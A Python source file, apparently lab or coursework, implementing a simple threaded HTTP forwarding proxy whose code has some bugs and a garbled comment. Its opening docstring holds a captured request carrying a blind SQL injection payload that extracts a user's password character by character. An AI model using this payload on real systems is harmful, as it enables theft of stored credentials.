
'''
POST /php/recherche_old.php HTTP/1.1
Host: 10.162.3.127
Content-Length: 120
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.162.3.127
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.162.3.127/php/recherche_old.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=j1ae1h2aa794casmgaahutqdh4
Connection: close

recherche=%27+AND+SUBSTRING%28usPasse%2C+15%2C+1%29%3D%27§b§%27+AND+usNom+LIKE+%22%25jobs%25%22%23&btnRechercher=Rechercher
'''
import sys
import socket, _thread as thread
import time
from urllib.parse import urlparse

def main():
    addr = "127.0.0.1"

    #Check input to program
    if len(sys.argv) < 2:
        print("Please input requested port")
        return
    elif len(sys.argv) > 2:
        print("Only provide one argument buddy")
        return
    
    port = int(sys.argv[1])

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        #Create and bind socket to specified port at loopback ip
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((addr, port))
        print("BOUND SOCKET")


        #Listen for incoming requests
        print("LISTENING...")
        sock.listen(1024)
        while True:
            #On request create connection socket and create new thread to handle connection
            conn, addr = sock.accept()
            print("HANDLING REQUEST...")
            thread.start_new_thread(client_thread, (conn, addr))

def client_thread(conn: socket, addr):
    #Parse url from client request
    request = conn.recv(1024)

    lines = request.split(b"\n")
    url = lines[0].decode("utf-8").split(" ")[1]

    location = urlparse(url).netloc

    fields = request.split("\r\n")
    fields = fields[1:] #ignore the GET / HTTP/1.1
    output = {}
    for field in fields:
        key,value = field.split(':', 1)
        output[key] = value

    print(field)

    #Spawn and cpython3.8 -m venv envonnect socket to url and forward client request
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        #print("Atempting to connect :)")
        sock.connect((location, 80))
        #print("Done :)")
        sock.send(request)
        #print("Request sent")

        #Read response until socket is closed by webserver
        """
        response = bytearray()
        while buffer := sock.recv(4096):
            response += buffer
        """
        response = sock.recv(6000)

        #print("SENDING")
        conn.sendall(response)
        #print("Done")



if __name__ == "__main__":
    main()






